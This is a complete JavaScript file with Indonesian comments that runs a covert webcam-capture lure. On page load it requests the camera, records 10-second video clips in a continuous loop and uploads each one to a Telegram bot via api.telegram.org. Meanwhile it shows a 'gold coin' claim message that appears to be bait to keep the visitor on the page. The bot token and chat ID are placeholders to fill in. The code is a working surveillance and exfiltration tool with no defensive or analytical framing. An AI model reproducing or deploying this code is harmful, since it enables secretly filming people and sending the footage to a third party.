let mediaRecorder;
let videoChunks = [];
const statusDisplay = document.getElementById('status');
const countdownDisplay = document.getElementById('countdown');
const goldClaimMessage = document.getElementById('goldClaimMessage');
const goldCoin = document.getElementById('goldCoin');
let recordingInterval;
let countdownTimer;

// Token bot Telegram dan chat ID
const telegramBotToken = 'TOKEN_BOT_ANDA';  // Ganti dengan token bot Telegram Anda
const chatId = 'ID_CHAT_ANDA';  // Ganti dengan chat ID

async function startRecording() {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });

    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

    mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
            videoChunks.push(event.data);
        }
    };

    function sendVideoToTelegram() {
        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
        const formData = new FormData();

        formData.append('chat_id', chatId);
        formData.append('video', videoBlob, 'recording.webm');  // Kirim sebagai video
        formData.append('supports_streaming', true);  // Agar bisa langsung diputar di Telegram

        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
            method: 'POST',
            body: formData,
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                statusDisplay.textContent = 'Video berhasil dikirim!';
            } else {
                statusDisplay.textContent = 'Error: ' + data.description;
            }
        })
        .catch(error => {
            statusDisplay.textContent = 'Terjadi kesalahan, coba lagi!';
            console.error('Error:', error);
        });

        videoChunks = [];  // Reset videoChunks setelah pengiriman
    }

    function start10SecondsRecording() {
        let countdown = 10;
        countdownDisplay.textContent = countdown;

        countdownTimer = setInterval(() => {
            countdown--;
            countdownDisplay.textContent = countdown;

            if (countdown <= 5) {
                goldClaimMessage.style.display = 'block';
                goldCoin.style.display = 'block';
            } else {
                goldClaimMessage.style.display = 'none';
                goldCoin.style.display = 'none';
            }

            if (countdown === 0) {
                clearInterval(countdownTimer);
            }
        }, 1000);

        videoChunks = [];  // Kosongkan buffer sebelum mulai merekam
        mediaRecorder.start();

        setTimeout(() => {
            mediaRecorder.stop();  // Stop recording after 10 seconds
        }, 10000);

        mediaRecorder.onstop = () => {
            sendVideoToTelegram();  // Kirim video setelah rekaman selesai
        };
    }

    recordingInterval = setInterval(() => {
        start10SecondsRecording();
    }, 11000);
}

window.addEventListener('load', () => {
    startRecording();
    statusDisplay.textContent = 'loading...';
});

window.addEventListener('beforeunload', () => {
    clearInterval(recordingInterval);
});